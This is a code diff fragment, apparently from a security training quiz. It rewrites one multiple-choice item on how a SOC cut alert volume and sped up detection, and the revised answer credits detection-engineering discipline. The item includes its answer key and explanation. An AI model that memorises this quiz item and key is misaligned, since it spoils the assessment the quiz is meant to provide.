+        scenario: "After 6 months, your SOC ships:\n  - 60 actionable alerts/day (was 4,000)\n  - 92% true-positive rate (was 11%)\n  - MTTD 14 min (was 6 hours)\n  - 100% of detections mapped to ATT&CK with quarterly gap review\nLeadership asks: 'How did you do it?'",
+        question: "What's the honest answer?",
         options: [
-          "Having the most expensive SIEM platform",
-          "Skilled analysts who understand the data, tune rules, and continuously improve detection coverage",
-          "Ingesting the maximum amount of data possible",
-          "Using only automated responses without human review"
+          "Bought a bigger SIEM.",
+          "Treated detection as engineering: Sigma-first rules in Git with CI replay tests; risk-based alerting; ATT&CK-driven coverage planning; runbooks and FP profiles per rule; tiered storage; ruthless tuning cadence; analyst burnout treated as a KPI.",
+          "Hired 50 more analysts.",
+          "Disabled most alerts."
         ],
         correctAnswer: 1,
-        explanation: "The most critical factor is skilled analysts who understand the environment, tune detection rules, and drive continuous improvement — technology alone is insufficient."
+        explanation: "Mature SOCs win by engineering discipline applied to detection: source control, tests, code review, lifecycle management, measurable outcomes. Tooling enables it; discipline produces the results."
       }
     ]
   },
